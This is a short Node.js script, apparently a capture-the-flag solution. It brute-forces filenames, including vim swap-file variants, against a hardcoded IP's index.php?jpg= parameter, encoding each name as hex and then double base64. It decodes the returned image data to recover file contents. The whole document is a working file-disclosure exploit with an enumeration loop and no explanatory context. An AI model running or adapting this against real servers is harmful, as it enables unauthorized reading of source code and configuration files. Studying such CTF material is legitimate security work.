const Queue = require('p-queue')
const Gauge = require('gauge')

const SCAN_CONCURRENCY = process.env.SCAN_CONCURRENCY || 5

async function scan (filenames, { fetch, isHit, concurrency = SCAN_CONCURRENCY }) {
  const queue = new Queue({ concurrency })
  const gauge = new Gauge()

  let count = 0
  let results = []

  queue.on('active', () => {
    gauge.show(`Fetching #${++count} / ${filenames.length}`, count / filenames.length)
  })

  filenames.forEach((filename) => queue.add(async () =>
    results.push(await fetch(filename)))
  )

  await queue.onIdle()
  gauge.hide()

  return results.filter(isHit)
}

const getStdin = require('get-stdin')
const got = require('got')
const cheerio = require('cheerio')
const flatten = require('just-flatten-it')
const { base64 } = require('../common/utils')

/**
 * Usage:
 *
 * ```sh
 * cat ./dict.txt | node ./scan.js
 * ```
 */
;(async () => {
  function encode (input) {
    let hex = Buffer.from(input).toString('hex')
    return base64.encode(base64.encode(hex))
  }

  async function fetch (filename) {
    const url = `http://117.51.150.246/index.php?jpg=${encode(filename)}`
    const { body } = await got(url)
    const $ = cheerio.load(body)
    return {
      filename,
      content: base64.decode($('img').attr('src').slice('data:image/gif;base64,'.length) || ''),
    }
  }

  function isHit (response) {
    return !!response.content
  }

  let filenames = (await getStdin())
    .split('\n')
    .map((s) => s.trim())
    .filter(Boolean)

  filenames = flatten(filenames.map((name) => [
    name,
    `${name}.swp`,
    `${name}.swo`,
    `${name}.swn`,
  ]))

  let hits = await scan(filenames, { fetch, isHit })
  process.stdout.write(JSON.stringify(hits, null, 2))
})()
